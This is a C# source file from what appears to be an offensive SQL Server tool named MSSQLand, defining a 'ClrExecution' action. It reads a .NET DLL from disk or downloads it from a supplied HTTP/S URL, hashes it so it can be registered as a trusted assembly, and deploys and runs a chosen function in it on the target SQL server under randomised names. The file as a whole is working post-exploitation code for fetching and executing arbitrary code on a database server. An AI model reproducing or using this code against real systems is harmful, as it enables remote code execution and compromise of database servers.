using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using MSSQLand.Utilities;
using MSSQLand.Services;

namespace MSSQLand.Actions.Execution
{
    internal class ClrExecution : BaseAction
    {
        private string _dllURI;
        private string _function;

        public override void ValidateArguments(string additionalArguments)
        {
            // Split the additional argument into parts (dll URI and function)
            string[] parts = SplitArguments(additionalArguments);

            if (parts.Length == 1)
            {
                _dllURI = parts[0].Trim();
                _function = "Main";
            }
            else if (parts.Length == 2)
            {
                _dllURI = parts[0].Trim();
                _function = parts[1].Trim();
            }

            else
            {
                throw new ArgumentException("Invalid arguments. CLR execution usage: dllURI function or dllURI");
            }

            if (string.IsNullOrEmpty(_dllURI))
            {
                throw new ArgumentException("The dllURI cannot be empty.");
            }
        }

        public override void Execute(DatabaseContext databaseContext)
        {
            // Step 1: Get the SHA-512 hash for the DLL and its bytes.
            string[] library = ConvertDLLToSQLBytes(_dllURI);

            if (library.Length != 2 || string.IsNullOrEmpty(library[0]) || string.IsNullOrEmpty(library[1]))
            {
                Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
                return;
            }


            string libraryHash = library[0];
            string libraryHexString = library[1];

            Logger.Info($"SHA-512 Hash: {libraryHash}");
            Logger.Info($"DLL Bytes Length: {libraryHexString.Length}");


            databaseContext.ConfigService.DeployAndExecuteClrAssembly(
                Guid.NewGuid().ToString("N").Substring(0, 6),
                _function,
                libraryHash,
                Guid.NewGuid().ToString("N").Substring(0, 6),
                library[1]
            );
        }


        /// <summary>
        /// Take a .NET assembly on disk and cnovert it
        /// to SQL compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytesFile(string dll)
        {
            string[] dllArr = new string[2];
            string dllHash = "";
            string dllBytes = "";

            // Read the DLL, create an SHA-512 hash for it and convert the DLL to SQL compatible bytes.
            try
            {
                FileInfo fileInfo = new(dll);
                Logger.Info($"{dll} is {fileInfo.Length} bytes.");

                // Get the SHA-512 hash of the DLL, so we can use sp_add_trusted_assembly to add it as a trusted DLL on the SQL server.
                using (SHA512 sha512 = SHA512.Create())
                {
                    using FileStream fileStream = File.OpenRead(dll);
                    foreach (byte hash in sha512.ComputeHash(fileStream))
                    {
                        dllHash += hash.ToString("x2");
                    }
                }

                // Read the local dll as bytes and store into the dllBytes variable, otherwise, the DLL will need to be on the SQL server.
                foreach (Byte b in File.ReadAllBytes(dll))
                {
                    dllBytes += b.ToString("X2");
                }

            }
            catch (FileNotFoundException)
            {
                Logger.Error($"Unable to load {dll}");
            }

            dllArr[0] = dllHash;
            dllArr[1] = dllBytes;
            return dllArr;
        }

        /// <summary>
        /// Downloads a .NET assembly from a remote HTTP/S location and converts it
        /// to SQL-compatible byte format for storage in a stored procedure.
        /// </summary>
        /// <param name="dll">The URL of the DLL to download.</param>
        /// <returns>An array containing the SHA-512 hash and SQL-compatible byte string.</returns>
        private static string[] ConvertDLLToSQLBytesWeb(string dll)
        {
            try
            {
                // Ensure a valid URL is provided
                if (string.IsNullOrWhiteSpace(dll) || (!dll.StartsWith("http://") && !dll.StartsWith("https://")))
                {
                    throw new ArgumentException($"Invalid DLL URL: {dll}");
                }

                Logger.Info($"Downloading DLL from {dll}");

                // Set up secure protocols for downloading the DLL
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

                // Download the DLL content
                byte[] dllBytes;
                using (var client = new WebClient())
                {
                    dllBytes = client.DownloadData(dll);
                }

                Logger.Info($"DLL downloaded successfully, size: {dllBytes.Length} bytes");

                // Compute the SHA-512 hash
                string dllHash;
                using (var sha512 = SHA512.Create())
                {
                    dllHash = BitConverter.ToString(sha512.ComputeHash(dllBytes)).Replace("-", "").ToLower();
                }

                Logger.Info($"SHA-512 hash computed: {dllHash}");

                // Convert the DLL bytes to a SQL-compatible hexadecimal string
                string dllHexString = BitConverter.ToString(dllBytes).Replace("-", "").ToUpper();

                return new[] { dllHash, dllHexString };
            }
            catch (WebException ex)
            {
                Logger.Error($"Failed to download DLL from {dll}. Web exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                Logger.Error($"An error occurred while processing the DLL: {ex.Message}");
            }

            // Return empty values in case of failure
            return new[] { string.Empty, string.Empty };
        }

        /// <summary>
        /// This method determines if the .NET assembly resides locally
        /// on disk, or remotely on a web server.
        /// </summary>
        /// <param name="dll"></param>
        /// <returns></returns>
        private static string[] ConvertDLLToSQLBytes(string dll)
        {
            string[] dllArr = dll.ToLower().Contains("http://") || dll.ToLower().Contains("https://")
            ? ConvertDLLToSQLBytesWeb(dll)
            : ConvertDLLToSQLBytesFile(dll);

            return dllArr;
        }
    }
}
